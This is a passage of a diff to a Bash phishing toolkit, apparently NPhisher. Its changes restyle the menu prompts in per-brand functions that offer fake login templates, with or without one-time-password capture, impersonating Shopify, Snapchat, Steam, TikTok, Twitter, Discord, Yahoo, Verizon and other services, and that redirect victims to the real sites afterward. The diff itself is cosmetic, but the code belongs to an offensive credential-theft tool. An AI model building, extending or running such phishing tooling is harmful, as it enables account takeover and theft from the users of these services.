-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2420,13 +2455,14 @@ site_shopify(){
 siname="Shopify"
 rdurl="www.shopify.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2447,13 +2483,14 @@ site_snapchat(){
 siname="Snapchat"
 rdurl="www.snapchat.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2474,13 +2511,14 @@ site_socialclub(){
 siname="SocialClub"
 rdurl="socialclub.rockstargames.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2501,13 +2539,14 @@ site_spotify(){
 siname="Spotify"
 rdurl="www.spotify.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2528,13 +2567,14 @@ site_stackoverflow(){
 siname="Stackoverflow"
 rdurl="stackoverflow.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2555,13 +2595,14 @@ site_steam(){
 siname="Steam"
 rdurl="store.steampowered.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2606,14 +2647,15 @@ site_tiktok(){
 siname="TikTok"
 rdurl="www.tiktok.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2641,7 +2683,8 @@ echo -e "${BLUE}[01]${CYAN} Twitch - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2666,13 +2709,14 @@ site_twitter(){
 siname="Twitter"
 rdurl="twitter.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2693,13 +2737,14 @@ site_ubereats(){
 siname="ubereats"
 rdurl="www.ubereats.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2720,13 +2765,14 @@ site_verizon(){
 siname="Verizon"
 rdurl="www.verizon.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2755,14 +2801,15 @@ site_vk(){
 siname="VK"
 rdurl="vk.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2795,13 +2842,14 @@ site_wordpress(){
 siname="Wordpress"
 rdurl="wordpress.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2822,13 +2870,14 @@ site_xbox(){
 siname="Xbox"
 rdurl="www.xbox.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2849,13 +2898,14 @@ site_yahoo(){
 siname="Yahoo"
 rdurl="yahoo.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2876,13 +2926,14 @@ site_yandex(){
 siname="Yandex"
 rdurl="yandex.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2903,13 +2954,14 @@ site_ytsubs(){
 siname="YT subs"
 rdurl="www.youtube.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2931,13 +2983,14 @@ site_discord(){
 siname="Discord"
 rdurl="www.discord.com"
 { clear; banner; echo -e ""; }
-echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e "${RED}[${WHITE}-${RED}]${ULBLUE} SITE : ${ULMAGENTA}${BOLDMAGENTA}${siname}"
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC} "
 echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2960,7 +3013,8 @@ rdurl="www.jio.com/business/jiofi"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
+selected="NPhisher/${siname}"
+urprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
